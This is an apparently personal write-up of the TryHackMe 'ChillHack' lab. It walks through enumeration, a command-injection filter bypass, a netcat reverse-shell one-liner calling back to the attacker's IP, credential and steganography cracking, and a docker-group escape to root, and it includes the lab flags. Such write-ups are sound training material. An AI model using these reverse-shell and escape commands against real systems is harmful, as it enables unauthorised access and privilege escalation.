---
title: "ChillHack @ Tryhackme"
date: 2025-04-19
categories: [Tryhackme, Easy]
tags: ["Command Injection, Docker escape"]
image:
  path: /assets/1.webp
---


### Enumeration:~#

Standard Nmap scan to identify the attack surface:

```bash
> nmap -sVC <ip adress>
```
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.73.207
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

I logged in on the ftp server with anonymous login and found a note.txt
```
> cat note.txt

Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
Ok there are filteriing on strings, but where.



### Web_Exploitation:~#
I proceeded to the webpage on port 80 to check the content.

![image description](/assets/2.webp)

Using ffuf, I found a directory /secret

![image description](/assets/3.webp)

The web server hosts a "Command Panel." It attempts to filter common shell commands just like we read from the note on the ftp server, but I found I could bypass the filter using backslashes (\) or by chaining commands.

![image description](/assets/4.webp)

I proceeded to get a reverse shell back to my machine

```
r\\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.73.207 1337 >/tmp/f
```

![image description](/assets/5.webp)

### Lateral_Movement:~#
I found a `.helpline.sh` script in the home directory of apaar
Running `sudo -l` shows we can run the script as apaar
When I ran the script, we are asked for some input. I first thought of editing the script to put my shell but no luck then I checked the script and how it processes user input. Then I decided to put /bin/bash as input for the $person and $msg. We got a shell as apaar

![image description](/assets/6.webp)

As apaar, I can read the user flag

```
apaar@ubuntu:~$ ls
ls
local.txt
apaar@ubuntu:~$ cat local.txt
cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

While enumerating further, I see a directory `files` in `/var/www` alongside the html directory

```
apaar@ubuntu:/var/www$ ls
ls
files  html
```
The `files` directory contains 4 files, including index.php, interesting.

![image description](/assets/7.webp)

The index.php file contains database creds

![image description](/assets/8.webp)

I proceeded to login to the database with these creds and found two users and their password hashes

![image description](/assets/9.webp)

The hashes were crackable but I tried loggin in with them, no luck.

I went back to the `files` folder from earlier, we had an images directory. I copied the images to my local machine to see if I can get something from it.
I ran stegseek on the jpeg image and a file was extracted, it was a zipped file.

![image description](/assets/10.webp)

The zipped file had a password so I used zip2john to get the hash and try to crack the resulting hash

![image description](/assets/11.webp)

I was able to unlock the zipped file and got a source_code.php file which contained the creds for the `anurodh` user

![image description](/assets/12.webp)

### Privilege_Escalation:~#
The `anurodh` user was in a docker group telling us that we're in a docker group

![image description](/assets/13.webp)

I used gtfobins to get the command for escaping a docker environment

![image description](/assets/14.webp)

```
anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
ls
# bin    dev   initrd.img      lib64  mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib      media  proc  sbin  swap.img  usr  vmlinuz.old
# whoami
root
# cd /root
# ls
proof.txt
# cat proof.txt

     {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
     |  Anurodh Acharya |
     ---------------------

                       Let me know if you liked it.

Twitter
 - @acharya_anurodh
Linkedin
 - www.linkedin.com/in/anurodh-acharya-b1937116a
```

